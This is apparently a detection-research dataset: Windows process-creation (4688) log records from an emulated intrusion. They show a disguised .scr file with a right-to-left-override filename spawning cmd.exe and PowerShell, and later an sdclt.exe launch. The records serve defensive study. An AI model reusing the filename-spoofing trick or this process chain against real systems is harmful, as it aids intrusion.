timestamp,Category,Channel,CommandLine,EventID,EventReceivedTime,EventTime,EventType,ExecutionProcessID,Hostname,Keywords,MandatoryLabel,Message,NewProcessId,NewProcessName,Opcode,OpcodeValue,ParentProcessName,ProcessId,ProviderGuid,RecordNumber,Severity,SeverityValue,SourceModuleName,SourceModuleType,SourceName,SubjectDomainName,SubjectLogonId,SubjectUserName,SubjectUserSid,TargetDomainName,TargetLogonId,TargetUserName,TargetUserSid,Task,ThreadID,TokenElevationType,Version,host,port,tags
2020-05-02T02:55:57.748Z,Process Creation,Security,"""C:\ProgramData\victim\â€®cod.3aka3.scr"" /S",4688,2020-05-01 22:55:57,2020-05-01 22:55:56,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-8192,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x3731F3

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x214c
	New Process Name:	C:\ProgramData\victim\â€®cod.3aka3.scr
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x1158
	Creator Process Name:	C:\Windows\explorer.exe
	Process Command Line:	""C:\ProgramData\victim\â€®cod.3aka3.scr"" /S

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",214C,C:\ProgramData\victim\â€®cod.3aka3.scr,Info,0,C:\Windows\explorer.exe,1158,{54849625-5478-4994-A5BA-3E3B0328C30D},70089,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3731F3,pbeesly,S-1-5-21-1830255721-3727074217-2423397540-1107,-,0,-,S-1-0-0,13312,5744,%%1938,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T02:56:05.819Z,Process Creation,Security,\\?\C:\windows\system32\conhost.exe --headless --width 80 --height 25 --signal 0x54c --server 0x540,4688,2020-05-01 22:56:05,2020-05-01 22:56:04,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-8192,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x3731F3

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1424
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x214c
	Creator Process Name:	C:\ProgramData\victim\â€®cod.3aka3.scr
	Process Command Line:	\\?\C:\windows\system32\conhost.exe --headless --width 80 --height 25 --signal 0x54c --server 0x540

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",1424,C:\Windows\System32\conhost.exe,Info,0,C:\ProgramData\victim\â€®cod.3aka3.scr,214C,{54849625-5478-4994-A5BA-3E3B0328C30D},70102,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3731F3,pbeesly,S-1-5-21-1830255721-3727074217-2423397540-1107,-,0,-,S-1-0-0,13312,4796,%%1938,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T02:56:05.825Z,Process Creation,Security,"""C:\windows\system32\cmd.exe""",4688,2020-05-01 22:56:05,2020-05-01 22:56:04,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-8192,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x3731F3

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xad4
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x214c
	Creator Process Name:	C:\ProgramData\victim\â€®cod.3aka3.scr
	Process Command Line:	""C:\windows\system32\cmd.exe""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",AD4,C:\Windows\System32\cmd.exe,Info,0,C:\ProgramData\victim\â€®cod.3aka3.scr,214C,{54849625-5478-4994-A5BA-3E3B0328C30D},70109,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3731F3,pbeesly,S-1-5-21-1830255721-3727074217-2423397540-1107,-,0,-,S-1-0-0,13312,4796,%%1938,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T02:56:15.939Z,Process Creation,Security,powershell,4688,2020-05-01 22:56:15,2020-05-01 22:56:14,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-8192,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x3731F3

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1738
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0xad4
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	powershell

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",1738,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Info,0,C:\Windows\System32\cmd.exe,AD4,{54849625-5478-4994-A5BA-3E3B0328C30D},70118,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3731F3,pbeesly,S-1-5-21-1830255721-3727074217-2423397540-1107,-,0,-,S-1-0-0,13312,4520,%%1938,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T02:57:03.854Z,Process Creation,Security,"""C:\windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe6_ Global\UsGthrCtrlFltPipeMssGthrPipe6 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon""",4688,2020-05-01 22:57:03,2020-05-01 22:57:01,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1038
	New Process Name:	C:\Windows\System32\SearchProtocolHost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x134c
	Creator Process Name:	C:\Windows\System32\SearchIndexer.exe
	Process Command Line:	""C:\windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe6_ Global\UsGthrCtrlFltPipeMssGthrPipe6 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",1038,C:\Windows\System32\SearchProtocolHost.exe,Info,0,C:\Windows\System32\SearchIndexer.exe,134C,{54849625-5478-4994-A5BA-3E3B0328C30D},70586,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,4796,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T02:57:03.858Z,Process Creation,Security,"""C:\windows\system32\SearchFilterHost.exe"" 0 772 776 784 8192 780",4688,2020-05-01 22:57:03,2020-05-01 22:57:01,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-8192,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1f18
	New Process Name:	C:\Windows\System32\SearchFilterHost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x134c
	Creator Process Name:	C:\Windows\System32\SearchIndexer.exe
	Process Command Line:	""C:\windows\system32\SearchFilterHost.exe"" 0 772 776 784 8192 780 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",1F18,C:\Windows\System32\SearchFilterHost.exe,Info,0,C:\Windows\System32\SearchIndexer.exe,134C,{54849625-5478-4994-A5BA-3E3B0328C30D},70593,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,4796,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T02:57:13.974Z,Process Creation,Security,\\?\C:\windows\system32\conhost.exe --headless --width 80 --height 25 --signal 0x474 --server 0x50c,4688,2020-05-01 22:57:13,2020-05-01 22:57:12,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-8192,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x3731F3

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xc50
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x214c
	Creator Process Name:	C:\ProgramData\victim\â€®cod.3aka3.scr
	Process Command Line:	\\?\C:\windows\system32\conhost.exe --headless --width 80 --height 25 --signal 0x474 --server 0x50c

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",C50,C:\Windows\System32\conhost.exe,Info,0,C:\ProgramData\victim\â€®cod.3aka3.scr,214C,{54849625-5478-4994-A5BA-3E3B0328C30D},70603,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3731F3,pbeesly,S-1-5-21-1830255721-3727074217-2423397540-1107,-,0,-,S-1-0-0,13312,5744,%%1938,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T02:57:13.974Z,Process Creation,Security,"""C:\windows\system32\cmd.exe""",4688,2020-05-01 22:57:13,2020-05-01 22:57:12,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-8192,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x3731F3

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xd98
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x214c
	Creator Process Name:	C:\ProgramData\victim\â€®cod.3aka3.scr
	Process Command Line:	""C:\windows\system32\cmd.exe""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",D98,C:\Windows\System32\cmd.exe,Info,0,C:\ProgramData\victim\â€®cod.3aka3.scr,214C,{54849625-5478-4994-A5BA-3E3B0328C30D},70604,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3731F3,pbeesly,S-1-5-21-1830255721-3727074217-2423397540-1107,-,0,-,S-1-0-0,13312,5744,%%1938,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T02:57:17.048Z,Process Creation,Security,powershell,4688,2020-05-01 22:57:17,2020-05-01 22:57:15,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-8192,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x3731F3

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1ad4
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0xd98
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	powershell

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",1AD4,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Info,0,C:\Windows\System32\cmd.exe,D98,{54849625-5478-4994-A5BA-3E3B0328C30D},70617,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3731F3,pbeesly,S-1-5-21-1830255721-3727074217-2423397540-1107,-,0,-,S-1-0-0,13312,5744,%%1938,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T02:58:43.786Z,Process Creation,Security,C:\windows\system32\sdclt.exe,4688,2020-05-01 22:58:43,2020-05-01 22:58:42,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-8192,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x3731F3

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1518
	New Process Name:	C:\Windows\System32\sdclt.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0xd98
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\windows\system32\sdclt.exe

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",1518,C:\Windows\System32\sdclt.exe,Info,0,C:\Windows\System32\cmd.exe,D98,{54849625-5478-4994-A5BA-3E3B0328C30D},70778,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3731F3,pbeesly,S-1-5-21-1830255721-3727074217-2423397540-1107,-,0,-,S-1-0-0,13312,4520,%%1938,2,wec.internal.cloudapp.net,60737,['mordorDataset']
